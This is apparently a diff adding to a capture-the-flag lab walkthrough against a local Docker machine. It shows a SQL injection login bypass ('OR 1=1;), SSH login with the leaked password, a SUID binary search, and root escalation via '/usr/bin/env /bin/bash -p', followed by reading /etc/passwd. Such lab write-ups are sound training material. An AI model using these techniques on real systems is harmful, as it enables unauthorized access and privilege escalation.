@@ -64,5 +64,122 @@ sudo nmap -sCV -p 22,80 -vvv 172.17.0.2 -oN service_vul_scan
   21   │ |_      httponly flag not set
   22   │ MAC Address: 02:42:AC:11:00:02 (Unknown)
   23   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-  24   │ 
+  24   │
 ```
+# Lets look what the website is running
+```
+whatweb 172.17.0.2
+```
+```
+http://172.17.0.2 [200 OK] Apache[2.4.52], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[172.17.0.2], PasswordField[password], Title[Iniciar Sesión]
+```
+# lets access the website
+```
+172.17.0.2
+```
+It takes us to the log in page
+we can try and perform sql injection in those fields
+```
+user: 'OR 1=1;
+password: 123
+```
+we try to log on as the first user and it was successful
+We get an pop up 
+```
+Welcome Dylan. You have correctly inserted your password: KJSDFG789FGSDF78
+```
+# Since ssh is open we can try to log in as dylan and use the password we got
+```
+ssh dylan@172.17.0.2
+dylan@172.17.0.2's password:
+```
+we get access as the dylan
+```
+dylan@172.17.0.2's password: 
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.12.20-amd64 x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+```
+# lets check if we have root priviliges
+```
+dylan@52fb1b04c80a:~$ sudo -l
+-bash: sudo: command not found
+```
+since there is no bash shell lets try to search for binaries that have root permission
+```
+find / -perm -4000 2>/dev/null
+```/usr/bin/chfn
+/usr/bin/umount
+/usr/bin/env
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/mount
+/usr/bin/passwd
+/usr/bin/su
+/usr/bin/gpasswd
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+```
+lets execute the the binary
+```
+/usr/bin/env /bin/bash
+```
+```
+dylan@52fb1b04c80a:~$ /usr/bin/env /bin/bash
+bash-5.1$ whoami
+dylan
+bash-5.1$ exit
+```
+the EUID on /usr/bin/env was not preserved so lets try again
+```
+/usr/bin/env /bin/bash -p
+```
+the result was as follows
+```
+dylan@52fb1b04c80a:~$ /usr/bin/env /bin/bash -p
+bash-5.1# whoami
+root
+bash-5.1# cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
+dylan:x:1000:1000:dylan,,,:/home/dylan:/bin/bash
+systemd-network:x:102:104:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:105:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:106::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:105:107:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+```
+
+
